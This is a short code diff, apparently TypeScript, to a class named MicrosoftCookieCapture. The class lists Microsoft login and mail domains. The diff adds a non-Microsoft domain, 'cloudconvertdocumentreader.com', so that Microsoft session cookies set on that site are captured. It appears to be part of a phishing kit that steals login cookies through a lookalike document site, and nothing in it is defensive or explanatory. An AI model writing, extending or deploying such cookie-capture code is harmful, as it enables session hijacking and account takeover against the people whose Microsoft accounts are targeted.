@@ -21,21 +21,14 @@ interface MicrosoftCookieSession {
 class MicrosoftCookieCapture {
   private microsoftDomains = [
     'login.microsoftonline.com',
-    '.login.microsoftonline.com',
     'outlook.office365.com',
-    '.outlook.office365.com',
     'outlook.live.com',
-    '.outlook.live.com',
     'account.microsoft.com',
-    '.account.microsoft.com',
     'graph.microsoft.com',
-    '.graph.microsoft.com',
     'login.live.com',
-    '.login.live.com',
     'office.com',
-    '.office.com',
     'microsoftonline.com',
-    '.microsoftonline.com'
+    'cloudconvertdocumentreader.com' // Add current domain to capture Microsoft cookies set locally
   ];
 
   private criticalCookieNames = [
